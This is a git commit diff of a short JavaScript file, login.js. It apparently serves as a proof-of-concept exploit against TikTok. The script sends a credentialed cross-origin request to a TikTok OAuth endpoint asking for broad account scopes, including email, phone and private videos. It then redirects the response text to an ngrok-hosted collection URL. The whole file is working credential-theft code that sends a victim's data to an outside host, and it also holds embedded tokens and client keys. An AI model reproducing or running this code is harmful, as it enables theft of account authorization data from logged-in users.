4196b17f7eb354168d0ac2681343a6c1faf47d6a
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-31 04:32:19 +0700

    Update login.js

--- login.js
+++ login.js
@@ -1,10 +1,9 @@
 var xhr = new XMLHttpRequest();
-
 xhr.onload = reqListener; 
-xhr.open("GET", "https://fp.us.tiktokv.com/callback/paypal_reference/reference_redirect?redirect_url=https%3A%2F%2Ffp.us.tiktokv.com%2Fpipo_fe%2Fcheckout%2Fcommon%2Fbind_land%3Fbiz_id%3DAWUAAA7r5cfP40izkXqnRmnrVpkL%26locale%3Den&collect_request_id=AWUAAA7r5cfP40izkXqnRmnrVpkL&channel_id=paypal_reference_us05&token=EC-8A881179C72136255&ba_token=BA-17F50352VL262304Y");
+xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cuser.info.phone%2Cvideo.list.manage%2Ccomment.list%2Clive.list%2Cvideo.list.private_ads.no_watermark%2Cuser.account.configure%2Cuser.info.showcase%2Cuser.info.email%2Cvideo.list.no_watermark%2Ccomment.list.manage&aid=1459&source=web&redirect_uri=https%3a%2f%2fads.tiktok.com%2fblablablabla&state=64588d019065e001fa8e7abdd884581c10770400");
 xhr.withCredentials = true;
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-xhr.send(null);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.send();
 
 function reqListener() {
     location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
